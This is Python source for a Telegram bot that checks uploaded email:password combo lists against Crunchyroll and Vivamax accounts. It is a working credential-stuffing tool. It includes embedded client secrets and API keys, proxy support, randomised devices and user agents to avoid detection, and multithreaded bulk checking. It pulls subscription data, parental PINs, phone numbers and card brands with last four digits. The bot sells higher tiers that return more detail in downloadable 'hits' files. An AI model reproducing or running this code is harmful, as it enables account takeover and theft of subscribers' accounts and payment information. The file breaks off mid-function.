━━━━━━━━━━━━━━━━━━━━━━━━
{mode_info["icon"]} <b>{mode_info["display"]}</b>
{features_text}
━━━━━━━━━━━━━━━━━━━━━━━━
<b>Current Mode:</b> <code>{mode_info["color"]} {mode_info["display"]}</code>

Click on a mode below to switch:
    """.strip()

    # Show ALL modes to everyone (including Vivamax)
    keyboard = []
    row = []
    for mode_key, info in MODES.items():
        button_text = f"{info['color']} {info['display']}" if mode_key == current_mode else f"{info['icon']} {info['display']}"
        row.append(InlineKeyboardButton(button_text, callback_data=f"set_mode:{mode_key}"))
        if len(row) == 2:
            keyboard.append(row)
            row = []
    if row:
        keyboard.append(row)

    # Back button
    keyboard.append([InlineKeyboardButton("🔙 Back to Settings", callback_data="menu_settings")])

    reply_markup = InlineKeyboardMarkup(keyboard)

    await query.edit_message_text(
        text,
        parse_mode='HTML',
        reply_markup=reply_markup
    )

def format_hit_for_file(result, user_plan="FREE", mode="Crunchyroll"):
    """Tiered formatting for the downloaded Hits .txt file"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")
    expiry_display = get_days_remaining(result['expiry']) if result.get('expiry') else 'N/A'

    if mode == "Vivamax":
        # === VIVAMAX RICH FORMAT (same as your standalone script) ===
        base = f"✅ HIT FOUND!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"👤 Name: {result.get('displayName', result.get('username', 'N/A'))}\n"
        base += f"📊 Status: {result.get('status', 'UNKNOWN')}\n"
        base += f"📌 Plan: {result.get('plan', 'Unknown')}\n"
        base += f"💰 Price: {result.get('price', 'N/A')}\n"
        base += f"📆 Billing: {result.get('billing', 'N/A')}\n"
        base += f"📅 Expires: {expiry_display}\n"
        base += f"⏳ Days Left: {result.get('days_left', 'N/A')}\n"
        base += f"🔄 Auto Renew: {result.get('auto_renew', '—')}\n"
        base += f"🔐 PIN: {result.get('pin', 'N/A')}\n"
        base += f"📱 Mobile: {result.get('mobile', 'N/A')}\n"
        base += f"🌍 Country: {country_code} {flag}\n"
        return base + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"
    else:
        base = f"✅ HIT FOUND!\n"
        base += f"📧 Email: {result['email']}\n"
        base += f"🔑 Password: {result['password']}\n"
        base += f"📊 Plan: {result['plan']}\n"
        base += f"📆 Expires: {expiry_display}\n"
        base += f"🌍 Country: {country_code} {flag}\n"

        if user_plan == "FREE":
            return base + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        elif user_plan == "BASIC":
            extra = f"• User: {result.get('username', 'Unknown')}\n"
            extra += f"• Verified: {result['email_verified']}\n"
            extra += f"• Free Trial: {result['free_trial']}\n"
            return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

        else:  # VIP / YEARLY - Full details
            extra = f"• User: {result.get('username', 'Unknown')}\n"
            extra += f"• Verified: {result['email_verified']}\n"
            extra += f"• Created: {result['account_creation'] or 'N/A'}\n"
            extra += f"• Free Trial: {result['free_trial']}\n"
            extra += f"• Plan(SUB): {result.get('plan_sub', 'Unknown')}\n"
            extra += f"• Max Streams: {result.get('max_streams', 'Unknown')}\n"
            extra += f"• Currency: {result['currency'] or 'N/A'}\n"
            extra += f"• Payment: {result.get('payment_method', 'Unknown')}\n"
            return base + extra + "━━━━━━━━━━━━━━━━━━━━━━━━\n\n"

def format_single_result(result, user_plan="FREE"):
    """Tiered hit result based on user's plan"""
    country_code = result.get('country', 'ZZ').upper()
    flag = REGION_HINTS.get(country_code, "🌍")

    country_names = {
        "BR": "Brazil", "US": "United States", "MX": "Mexico", "CL": "Chile",
        "FR": "France", "DE": "Germany", "IT": "Italy", "ES": "Spain",
        "GB": "United Kingdom", "CA": "Canada", "AU": "Australia",
        "AR": "Argentina", "CO": "Colombia", "PE": "Peru", "UY": "Uruguay",
        "ZA": "South Africa", "TR": "Turkey", "NO": "Norway", "NZ": "New Zealand",
        "CR": "Costa Rica", "ZZ": "Unknown",
    }

    country_name = country_names.get(country_code, country_code)
    country_display = f"{country_name} {flag}"

    if not result['success']:
        return f"""
❌ <b>CHECK FAILED</b>

📧 <b>Email:</b> <code>{result['email']}</code>

📌 <b>Status:</b> {result['message']}

Try another account!
        """.strip()

    expiry_display = get_days_remaining(result['expiry']) if result['expiry'] else 'N/A'

    # ==================== TIER-BASED FORMATTING ====================
    base = f"""
✅ <b>HIT FOUND!</b>

📧 <b>Email:</b> <code>{result['email']}</code>
🔑 <b>Password:</b> <code>{result['password']}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
📊 <b>Account Details</b>
• <b>Active:</b> ✅ {result['active']}
• <b>Plan:</b> <code>{result['plan']}</code>
• <b>Expires In:</b> <code>{expiry_display}</code>
• <b>Country:</b> <code>{country_display}</code>
"""

    if user_plan == "FREE":
        # Basic only
        extra = ""
    elif user_plan == "BASIC":
        # Medium
        extra = f"""
• <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
• <b>Verified:</b> <code>{result['email_verified']}</code>
• <b>Free Trial:</b> <code>{result['free_trial']}</code>
"""
    else:  # VIP or YEARLY
        # Full rich details
        extra = f"""
• <b>User:</b> <code>{result.get('username', 'Unknown')}</code>
• <b>Verified:</b> <code>{result['email_verified']}</code>
• <b>Created:</b> <code>{result['account_creation'] or 'N/A'}</code>
• <b>Free Trial:</b> <code>{result['free_trial']}</code>
• <b>Plan(SUB):</b> <code>{result.get('plan_sub', 'Unknown')}</code>
• <b>Max Streams:</b> <code>{result.get('max_streams', 'Unknown')}</code>
• <b>Currency:</b> <code>{result['currency'] or 'N/A'}</code>
• <b>Payment:</b> <code>{result.get('payment_method', 'Unknown')}</code>
"""
    return (base + extra + f"""
━━━━━━━━━━━━━━━━━━━━━━━━
Channel: {CHANNEL_USERNAME}
""").strip()


def check_vivamax(email: str, password: str, proxy=None):
    """Real Vivamax Checker - Fully integrated with your bot"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'Yes',
        'account_creation': '',
        'plan': 'Unknown',
        'currency': 'PHP',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': 'N/A',
        'active': 'False',
        'country': 'PH',
        'username': 'N/A',
        'plan_sub': 'Unknown',
        'max_streams': '1',
        'payment_method': 'N/A',
        # Vivamax specific fields
        'displayName': 'N/A',
        'status': 'Unknown',
        'days_left': 'N/A',
        'stars': '—',
        'auto_renew': '—',
        'price': 'N/A',
        'billing': 'N/A',
        'pin': 'N/A',
        'mobile': 'N/A',
    }

    # Plan mapping (from your original script)
    PLAN_MAPPING = {
        "three_months_app": {"price": "₱419.00", "billing": "3 months"},
        "one_month": {"price": "₱169.00", "billing": "1 month"},
        "one_month_max2": {"price": "₱499.00", "billing": "1 month"},
        "six_months_max2": {"price": "₱2490.00", "billing": "6 months"},
        "one_year_max2": {"price": "₱4790.00", "billing": "1 year"},
        "vmx_club_1-month": {"price": "₱99.00", "billing": "1 month"},
        "vmx_club_3-months": {"price": "₱269.00", "billing": "3 months"},
        "vmx_club_6-months": {"price": "₱499.00", "billing": "6 months"},
        "vmx_club_1-year": {"price": "₱949.00", "billing": "1 year"},
    }

    try:
        # === 1. Firebase Login ===
        headers = {
            'accept': '*/*',
            'accept-language': 'en-US,en;q=0.6',
            'content-type': 'application/json',
            'origin': 'https://identity.vivamax.net',
            'referer': 'https://identity.vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
        }

        resp = requests.post(
            "https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyPassword?key=AIzaSyBEUyk0R5bNsi_FCdK-L4Ztz5OENMA6O_U",
            json={"email": email, "password": password, "returnSecureToken": True},
            headers=headers,
            timeout=20
        )

        if resp.status_code != 200:
            result['message'] = "Invalid email or password"
            return result

        id_token = resp.json().get("idToken")
        if not id_token:
            result['message'] = "Login failed"
            return result

        # === 2. Vivamax Login ===
        login_headers = {
            'accept': 'application/json, text/plain, */*',
            'content-type': 'application/json',
            'origin': 'https://vivamax.net',
            'referer': 'https://vivamax.net/',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'x-appname': 'Vivamax/release-R60-6'
        }

        device_payload = {
            "idToken": id_token,
            "deviceType": "COMP",
            "modelNo": "20030107",
            "deviceName": "Win32",
            "deviceId": "-459410908",
            "serialNo": "-459410908"
        }

        viva_resp = requests.post(
            "https://api2.vivamax.net/v1/viva/login",
            json=device_payload,
            headers=login_headers,
            timeout=20
        )

        if viva_resp.status_code not in (200, 201):
            result['message'] = f"Login failed ({viva_resp.status_code})"
            return result

        data = viva_resp.json()

        # === 3. Extract Data ===
        result['success'] = True
        result['username'] = data.get("displayName", "N/A")
        result['displayName'] = result['username']
        result['status'] = data.get("subscriptionStatus", data.get("status", "UNKNOWN")).upper()
        result['plan'] = data.get("subscriptionId", "Unknown")
        result['pin'] = data.get("parentalControlPin", "N/A")
        result['mobile'] = data.get("mobileNumber", "N/A")
        result['country'] = data.get("subscriptionLocation", data.get("registerLocation", "PH"))

        # Expiry & Days Left
        expiry_ts = data.get("subscriptionExpiryTime")
        if expiry_ts:
            try:
                expiry_date = datetime.fromtimestamp(expiry_ts / 1000)
                result['expiry'] = expiry_date.strftime("%Y-%m-%d")
                days_left = (expiry_date - datetime.now()).days
                result['days_left'] = str(days_left) if days_left >= 0 else "Expired"
            except:
                pass

        # Price & Billing
        plan_key = result['plan']
        if plan_key in PLAN_MAPPING:
            p = PLAN_MAPPING[plan_key]
            result['price'] = p["price"]
            result['billing'] = p["billing"]

        # Auto Renew
        sub = data.get("subscription", {})
        apple = sub.get("appleSubscriptionDetails", {})
        pending = apple.get("pending_renewal_info", [{}])[0]
        if pending.get("auto_renew_status") == "1":
            result['auto_renew'] = "ON"
        elif pending.get("auto_renew_status") == "0":
            result['auto_renew'] = "OFF"

        # Active status
        if result['status'] == "ACTIVE" and plan_key != "Unknown":
            result['active'] = 'Yes'
            result['plan_sub'] = result['plan']
            result['account_type'] = "Premium"
        else:
            result['active'] = 'No'
            result['account_type'] = "Expired" if result['status'] in ["EXPIRED", "INACTIVE"] else "Free"

        result['message'] = 'ACTIVE SUBSCRIPTION!' if result['active'] == 'Yes' else 'Valid account but no active plan'

    except Exception as e:
        result['message'] = f"Error: {str(e)[:100]}"

    return result

def check_crunchyroll(email, password, proxy=None):
    """FINAL VERSION - Stronger Payment Method extraction"""
    result = {
        'email': email,
        'password': password,
        'success': False,
        'message': '',
        'email_verified': 'No',
        'account_creation': '',
        'plan': 'None',
        'currency': 'N/A',
        'subscribable': 'False',
        'free_trial': 'False',
        'expiry': '',
        'active': 'False',
        'country': 'ZZ',
        'username': 'Unknown',
        'plan_sub': 'Unknown',
        'max_streams': 'Unknown',
        'payment_method': 'Unknown'
    }

    proxies = {'http': proxy, 'https': proxy} if proxy else None
    max_retries = 4

    for attempt in range(max_retries):
        try:
            device_id, _, _ = generate_random_device_info()
            user_agent = generate_random_user_agent()

            # ====================== LOGIN ======================
            token_url = "https://beta-api.crunchyroll.com/auth/v1/token"
            token_data = {
                "grant_type": "password",
                "username": email,
                "password": password,
                "scope": "offline_access",
                "client_id": "y2arvjb0h0rgvtizlovy",
                "client_secret": "JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2",
                "device_type": "SamsungTV",
                "device_id": device_id,
                "device_name": "Goku"
            }

            headers = {
                "host": "beta-api.crunchyroll.com",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": device_id,
                "content-type": "application/x-www-form-urlencoded",
                "user-agent": user_agent,
                "accept-encoding": "gzip"
            }

            resp = requests.post(token_url, data=token_data, headers=headers, proxies=proxies, timeout=25)

            if resp.status_code == 200:
                access_token = resp.json().get('access_token')
                if not access_token:
                    continue
            elif resp.status_code == 401:
                result['message'] = "Invalid email or password"
                return result
            elif resp.status_code == 429:
                time.sleep(3 + attempt * 2)
                continue
            else:
                if attempt < max_retries - 1:
                    time.sleep(1.5 + random.uniform(0, 1))
                    continue
                result['message'] = f"Login failed (HTTP {resp.status_code})"
                return result

            acc_headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': user_agent,
                'etp-anonymous-id': str(uuid.uuid4()),
                'x-datadog-sampling-priority': '0',
                'accept-encoding': 'gzip'
            }

            acc_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me",
                                  headers=acc_headers, proxies=proxies, timeout=25)

            if acc_resp.status_code == 200:
                acc_data = acc_resp.json()
                result['email_verified'] = 'Yes' if acc_data.get('email_verified') else 'No'
                if acc_data.get('created'):
                    result['account_creation'] = acc_data['created'].split('T')[0]
                external_id = acc_data.get('external_id')

                if external_id:
                    # Subscription
                    subs_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if subs_resp.status_code == 200:
                        subs_data = subs_resp.json()
                        result['active'] = 'Yes' if subs_data.get('is_active') else 'No'
                        result['expiry'] = subs_data.get('next_renewal_date', '').split('T')[0] if subs_data.get('next_renewal_date') else ''
                        result['country'] = subs_data.get('country_code', 'ZZ')

                    # Products
                    prod_resp = requests.get(f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/products",
                                           headers=acc_headers, proxies=proxies, timeout=25)
                    if prod_resp.status_code == 200:
                        items = prod_resp.json().get('items', [])
                        if items:
                            product = items[0].get('product', {})
                            result['plan'] = product.get('sku', 'None')
                            result['currency'] = items[0].get('currency_code', 'N/A')
                            result['subscribable'] = 'Yes' if product.get('is_subscribable') else 'False'
                            result['free_trial'] = 'Yes' if items[0].get('active_free_trial') else 'False'

                    # ================== IMPROVED PAYMENT EXTRACTION v3 ==================
                    payment_method = "Unknown"
                    card_brand = ""
                    last4 = ""

                    def find_payment_info(data):
                        nonlocal payment_method, card_brand, last4
                        if isinstance(data, dict):
                            for k, v in data.items():
                                key_lower = k.lower()
                                v_str = str(v).lower() if v is not None else ""
                                if key_lower in ['payment_method', 'payment_type', 'method', 'billing_method', 'type']:
                                    if isinstance(v, str) and v.strip() and v.lower() not in ['none', 'null', '']:
                                        payment_method = v.strip().capitalize()
                                if any(x in key_lower for x in ['brand', 'card_brand', 'card_type', 'issuer']) and isinstance(v, str) and v.strip():
                                    card_brand = v.strip().capitalize()
                                if any(x in key_lower for x in ['last4', 'last_four', 'last4digits', 'last_digits']) and isinstance(v, (str, int)):
                                    last4 = str(v).strip().zfill(4)
                                if any(term in v_str for term in ['visa', 'mastercard', 'amex', 'discover', 'paypal', 'apple', 'google', 'stripe']):
                                    if isinstance(v, str) and v.strip():
                                        payment_method = v.strip().capitalize()
                                find_payment_info(v)
                        elif isinstance(data, list):
                            for item in data:
                                find_payment_info(item)

                    # Check benefits
                    benefits_resp = requests.get(
                        f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits",
                        headers=acc_headers, proxies=proxies, timeout=25
                    )
                    if benefits_resp.status_code == 200:
                        try:
                            benefits_json = benefits_resp.json()
                            find_payment_info(benefits_json)
                        except:
                            pass

                    # Check products (very important for payment info)
                    if prod_resp.status_code == 200:
                        try:
                            prod_json = prod_resp.json()
                            find_payment_info(prod_json)
                        except:
                            pass

                    # Raw text fallback
                    if payment_method == "Unknown" or not (card_brand and last4):
                        raw_text = ""
                        if benefits_resp.status_code == 200:
                            raw_text += benefits_resp.text
                        if prod_resp.status_code == 200:
                            raw_text += prod_resp.text
                        brand_match = re.search(r'"brand"\s*:\s*"([^"]+)"', raw_text, re.I)
                        last4_match = re.search(r'"last4"\s*:\s*["\']?(\d{4})["\']?', raw_text, re.I)
                        if brand_match and last4_match:
                            card_brand = brand_match.group(1).capitalize()
                            last4 = last4_match.group(1)
                        elif re.search(r'paypal|apple.*pay|google.*pay|stripe', raw_text, re.I):
                            match = re.search(r'paypal|apple.*pay|google.*pay|stripe', raw_text, re.I)
                            if match:
                                payment_method = match.group(0).capitalize()

                    # Final payment result
                    if card_brand and last4:
                        result['payment_method'] = f"{card_brand} •••• {last4}"
                    elif payment_method != "Unknown":
                        result['payment_method'] = payment_method
                    else:
                        result['payment_method'] = "Unknown / Third-party"
                    # ====================================================================

                    # Plan & Max Streams (kept from your original code)
                    if benefits_resp.status_code == 200:
                        benefits_data = benefits_resp.text
                        benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
                        if benefit_match:
                            streams = benefit_match.group(1)
                            if streams == "6":
                                result['plan_sub'] = "ULTIMATE FAN MEMBER"
                                result['max_streams'] = "6"
                            elif streams == "4":
                                result['plan_sub'] = "MEGA FAN MEMBER"
                                result['max_streams'] = "4"
                            elif streams == "1":
                                result['plan_sub'] = "FAN MEMBER"
                                result['max_streams'] = "1"
                            else:
                                result['plan_sub'] = f"UNKNOWN ({streams})"
                                result['max_streams'] = streams

            # Username
            profile_resp = requests.get("https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile",
                                      headers=acc_headers, proxies=proxies, timeout=25)
            if profile_resp.status_code == 200:
                profile_data = profile_resp.text
                username_match = re.search(r'"username":"(.*?)"', profile_data)
                if username_match:
                    result['username'] = username_match.group(1)

            # Final decision
            if result['active'] == 'Yes':
                result['success'] = True
                result['message'] = 'ACTIVE SUBSCRIPTION!'
            else:
                result['message'] = 'Valid account but no paid plan'

            return result

        except Exception as e:
            if attempt < max_retries - 1:
                time.sleep(2 ** attempt + random.uniform(0.5, 2))
                continue
            result['message'] = f'Error: {str(e)[:80]}'
            return result

    return result

async def start(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    user_id = update.effective_user.id

    # Save username/first_name on first use
    username = update.effective_user.username
    first_name = update.effective_user.first_name

    stats = get_user_stats(user_id)

    # Update name info if missing
    if not stats.get('username') and username:
        update_user_stats(user_id, {"username": username, "first_name": first_name})
    

    reset_daily_if_needed(stats, user_id)
    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)

    # File statistics for dashboard
    max_files = limits.get("multi_scan_max_files", 1)
    today_files = stats.get("today_files", 0)
    
    keyboard = [
        [
            InlineKeyboardButton("📊 My Stats", callback_data="menu_stats"),
            InlineKeyboardButton("🔗 My Referrals", callback_data="menu_referrals")
        ],
        [
            InlineKeyboardButton("🎁 Rewards & Gifts", callback_data="menu_rewards"),
            InlineKeyboardButton("💎 Membership", callback_data="menu_membership")
        ],
        [
            InlineKeyboardButton("📞 Support", callback_data="menu_support"),
            InlineKeyboardButton("⚙️ Settings", callback_data="menu_settings")
        ]
    ]

    reply_markup = InlineKeyboardMarkup(keyboard)
    
    welcome = f"""
<b>𝗪𝗘𝗟𝗖𝗢𝗠𝗘 𝗧𝗢 𝗖𝗔𝗬'𝗦 • 𝗖𝗥𝗨𝗡𝗖𝗛𝗬𝗥𝗢𝗟𝗟 𝗖𝗛𝗘𝗖𝗞𝗘𝗥 𝗕𝗢𝗧</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📤 <b>Send your combo list (.txt file)</b>
<i>Format: mail:pass (one per line)</i>
━━━━━━━━━━━━━━━━━━━━━━━━
📊<b>Your Dashboard:</b>
🧵 Threads: <code><b>{limits['current_threads']}/{limits['max_threads']}</b></code>
📁 Files Today: <code><b>{today_files}/{max_files}</b></code>
👑 Plan: <code><b>{limits['display_name']}</b></code>
📅 Days Left: <code><b>{get_days_remaining(stats['expires'])}</b></code>
📈 Daily Limit: <code><b>{limits['remaining_text']}</b></code>
📡 Mode: <code><b>{get_mode_display(stats.get('api_mode'))} Check</b></code>
━━━━━━━━━━━━━━━━━━━━━━━━
<b>👇 Select an option from the menu below:</b>
"""
    context.user_data['in_main_menu'] = True

    await update.message.reply_text(
        welcome,
        parse_mode='HTML',
        reply_markup=reply_markup,
        reply_to_message_id=update.message.message_id
    )

async def process_thread_count_input(update: Update, context: CallbackContext):
    text = update.message.text.strip()
    user_id = update.effective_user.id
    
    try:
        new_threads = int(text)
        stats = get_user_stats(user_id)
        limits = get_plan_limits(stats)
        max_allowed = limits["max_threads"]
        plan_name = limits["display_name"]

        if 1 <= new_threads <= max_allowed:
            # Update in database
            update_user_stats(user_id,{
                "threads": new_threads
            })
            
            # Show confirmation
            await update.message.reply_text(
                f"✅ <b>Thread count updated to {new_threads} for your account.</b>",
                parse_mode='HTML'
            )
            
            # Clear waiting state
            context.user_data['waiting_for_threads'] = False
            
            # Redirect back to main menu
            await edit_to_main_menu(update, context)
            
        else:
            await update.message.reply_text(
                f"❌ Your plan <b>({plan_name})</b> allows a maximum of <b>{max_allowed}</b> threads.",
                parse_mode='HTML'
            )
            return

    except ValueError:
        await update.message.reply_text(
            "❌ Invalid number! Send a number only.",
            parse_mode='HTML'
        )
        return

async def handle_message(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return
    
    user_id = update.effective_user.id  # ← get once, use everywhere

    if context.user_data.get('waiting_for_threads'):
        await process_thread_count_input(update, context)
        return
    
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    text = update.message.text.strip()
    looks_like_combo = ':' in text and '@' in text
    
    # 🔥 NEW: Only trigger single checker when on the main dashboard
    if is_on_main_menu:
        if looks_like_combo:
            parts = text.split(':', 1)
            email = parts[0].strip()
            password = parts[1].strip()

            stats = get_user_stats(user_id)
            reset_daily_if_needed(stats, user_id)
            stats = get_user_stats(user_id)
            limits = get_plan_limits(stats)
            
            if limits["daily_limit"] is not None:
                if stats["today_scans"] + 1 > limits["daily_limit"]:
                    await update.message.reply_text(
                        f"<b>❌ Daily limit reached!</b>\n\n"
                        f"You have already used <b>{stats['today_scans']}/{limits['daily_limit']}</b> scans today.\n"
                        f"Upgrade your plan or wait until tomorrow.",
                        parse_mode='HTML'
                    )
                    return
            
            status_msg = await update.message.reply_text(
                f"🔍 Checking <code>{email}</code>...\nPlease wait...", 
                parse_mode='HTML'
            )
            
            # Use correct checker based on user's selected mode
            mode = stats.get("api_mode", "Crunchyroll")
            checker = get_checker_function(mode, user_id)
            result = await run_blocking(checker, email, password)
                        
            # Get current user's plan
            stats = get_user_stats(user_id)
            user_plan = stats.get("plan", "FREE").upper()

            response = format_single_result(result, user_plan)
            await status_msg.edit_text(response, parse_mode='HTML')
            
            # 🔥 AUTO PIN THE RESULT
            await manage_result_pin(update, context, status_msg.message_id)
            
            hits_increment = 1 if result['success'] else 0
            bad_increment = 1 if not result['success'] else 0
            
            update_user_stats(user_id, {
                "total_scans": stats["total_scans"] + 1,
                "total_hits": stats["total_hits"] + hits_increment,
                "total_free": stats.get("total_free", 0) + bad_increment,
                "today_scans": stats["today_scans"] + 1
            })
            return
        else:
            await update.message.reply_text(
                """❌ <b>Invalid Format!</b>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    Send like this:
    <code>email:password</code>
    <b>Example:</b>
    <code>user@example.com:supersecret123</code>
    ━━━━━━━━━━━━━━━━━━━━━━━━
    💡 You can also send a <b>.txt file</b> with multiple accounts (one per line).""",
                parse_mode='HTML'
            )
            return
    else:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return

async def handle_document(update: Update, context: CallbackContext):
    if not await check_subscription(update, context):
        await send_join_channel_message(update, context)
        return

    document = update.message.document
    is_on_main_menu = context.user_data.get('in_main_menu', False)
    
    if not is_on_main_menu:
        warning = await update.message.reply_text(
            """🚧 You can only check accounts from the home dashboard.""",
            parse_mode='HTML'
        )
        await asyncio.sleep(3)
        await warning.delete()
        return
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please send a .txt file only!", parse_mode='HTML')
        return
    
    user_id = update.effective_user.id
    
    # ==================== BLOCK BULK UPLOAD FOR FREE PLAN ====================
    stats = get_user_stats(user_id)        # ← pass user_id
    limits = get_plan_limits(stats)

    if limits["display_name"] == "FREE":
        await update.message.reply_text(
            f"❌ <b>FREE Plan limitation</b>\n\n"
            f"Bulk file upload is not available on FREE plan.\n"
            f"Please use single checks (<code>email:password</code>) or upgrade to BASIC/VIP.",
            parse_mode='HTML'
        )
        return
    # =====================================================================

    # Paid users (BASIC+) continue with normal file limit check
    max_files = limits.get("multi_scan_max_files", 1)

    reset_daily_if_needed(stats, user_id)  # ← pass user_id
    stats = get_user_stats(user_id)

    if stats.get("today_files", 0) >= max_files:
        await update.message.reply_text(
            f"❌ <b>Daily file limit reached!</b>\n\n"
            f"Your <b>{limits['display_name']}</b> plan allows only <b>{max_files}</b> file{'' if max_files == 1 else 's'} per day.\n\n"
            f"Come back tomorrow or upgrade your plan.",
            parse_mode='HTML'
        )
        return

    # Increment counters (only paid users reach here)
    update_user_stats(user_id, {"today_files": stats.get("today_files", 0) + 1})
    update_user_stats(user_id, {"total_combo_files": stats.get("total_combo_files", 0) + 1})

    # ====================== Normal file processing ======================
    file = await context.bot.get_file(document.file_id)
    file_content = await file.download_as_bytearray()
    lines = file_content.decode('utf-8', errors='ignore').splitlines()
    
    accounts = []
    for line in lines:
        line = line.strip()
        if line and ':' in line and not line.startswith('#'):
            email, pwd = line.split(':', 1)
            accounts.append((email.strip(), pwd.strip()))
    
    if not accounts:
        await update.message.reply_text("❌ No valid accounts found!", parse_mode='HTML')
        return

    total = len(accounts)

    # Daily scan limit check
    if limits["daily_limit"] is not None:
        used = stats.get("today_scans", 0)
        remaining = limits["daily_limit"] - used
        if total > remaining:
            await update.message.reply_text(
                f"❌ <b>Not enough scans left today!</b>\n\n"
                f"• You have <b>{remaining}</b> scans remaining\n"
                f"• This file contains <b>{total}</b> accounts\n\n"
                f"Please send a smaller file (maximum <b>{remaining}</b> lines) or wait until tomorrow.",
                parse_mode='HTML'
            )
            return

    # ====================== Start scanning ======================
    hits = []
    start_time = time.time()

    stats = get_user_stats(user_id)
    limits = get_plan_limits(stats)
    user_threads = limits["current_threads"]

    if limits["display_name"] == "FREE":
        max_rps = 12
    elif "BASIC" in limits["display_name"]:
        max_rps = 22
    else:
        max_rps = 32
    rate_limiter = RateLimiter(max_rps=max_rps)

    progress_msg = await update.message.reply_text(
        f"🚀 Starting bulk check with <b>{user_threads}</b> threads...\n"
        f"Mode: <b>{get_mode_display(stats.get('api_mode'))}</b>\n"
        f"0/{total} completed (0%)", 
        parse_mode='HTML'
    )

    def check_account(acc):
        email, pwd = acc
        rate_limiter.acquire()
        # Use correct checker based on user's selected mode
        mode = stats.get("api_mode", "Crunchyroll")
        checker = get_checker_function(mode, user_id)
        result = checker(email, pwd)
        time.sleep(0.8 + random.uniform(0.6, 1.2))
        return result
    
    completed = 0
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=user_threads) as executor:
        future_to_acc = {executor.submit(check_account, acc): acc for acc in accounts}
        
        for future in concurrent.futures.as_completed(future_to_acc):
            result = future.result()
            completed += 1
            
            if result['success']:
                hits.append(result)
            
            if completed % 5 == 0 or completed == total:
                try:
                    percent = int((completed / total) * 100)
                    await progress_msg.edit_text(
                        f"🚀 Checking with {user_threads} threads...\n"
                        f"{completed}/{total} completed ({percent}%)",
                        parse_mode='HTML'
                    )
                except:
                    pass

    # ====================== UPDATE STATS ======================
    hits_count = len(hits)
    bad_count = total - hits_count
    current_stats = get_user_stats(user_id)

    update_user_stats(user_id, {
        "total_scans": current_stats["total_scans"] + total,
        "total_hits": current_stats["total_hits"] + hits_count,
        "total_free": current_stats.get("total_free", 0) + bad_count,
        "today_scans": current_stats["today_scans"] + total
    })

    # ====================== SUMMARY + HITS/BAD FILES (rest of your original code) ======================
    elapsed = int(time.time() - start_time)
    cpm = int((total / elapsed) * 60) if elapsed > 0 else 0
    
    summary = f"""
<b>📊 Scan Completed ✅</b>
━━━━━━━━━━━━━━━━━━━━━━━━
📁 <b>File:</b> <code>{document.file_name}</code>
📊 <b>Processed:</b> <code>{completed}/{total}</code>
🧵 <b>Threads:</b> <code>{user_threads}</code>
📡 Mode: <code>{get_mode_display(stats.get('api_mode'))}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
✅ <b>HITS:</b> <code>{hits_count}</code>
❌ <b>BAD:</b> <code>{bad_count}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
⏱ <b>Elapsed:</b> <code>{elapsed}s</code>
⚡ <b>CPM:</b> <code>{cpm}</code>
━━━━━━━━━━━━━━━━━━━━━━━━
"""
    await progress_msg.edit_text(summary, parse_mode='HTML')
    await manage_result_pin(update, context, progress_msg.message_id)

    # ====================== HITS + BAD FILES ======================
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    
# ====================== FULL CAPTION HITS FILE (Tiered) ======================
    if hits_count > 0:
        # Get user's plan for tiered formatting
        current_stats = get_user_stats(user_id)
        user_plan = current_stats.get("plan", "FREE").upper()
        mode = stats.get("api_mode", "Crunchyroll")

        hits_text = f"🎉 {mode.upper()} HITS - {user_plan} PLAN\n" + "="*70 + "\n\n"
        
        for hit in hits:
            hits_text += format_hit_for_file(hit, user_plan, mode)

        hits_file = f"/tmp/crunchy_hits_{timestamp}.txt"
        with open(hits_file, "w", encoding="utf-8") as f:
            f.write(hits_text)

        fancy_caption = f"""
👍 <b>{hits_count}x Crunchyroll Hits</b>
────────────────────────
☰ BY @caydigitals ✅
────────────────────────
<a href="https://t.me/caysredirect">BOT</a> | <a href="https://t.me/cayigitals">Admin</a>
        """.strip()

        await update.message.reply_document(
            document=open(hits_file, "rb"),
            filename=f"Crunchyroll Hits @caydigitals.txt",
            caption=fancy_caption,
            parse_mode='HTML'
        )

    if bad_count > 0:
        bad_text = "EMAIL:PASSWORD | STATUS\n" + "="*40 + "\n"
        hit_emails = {hit['email'] for hit in hits}
        for email, pwd in accounts:
            status = "HIT" if email in hit_emails else "BAD"
            bad_text += f"{email}:{pwd} | {status}\n"
        
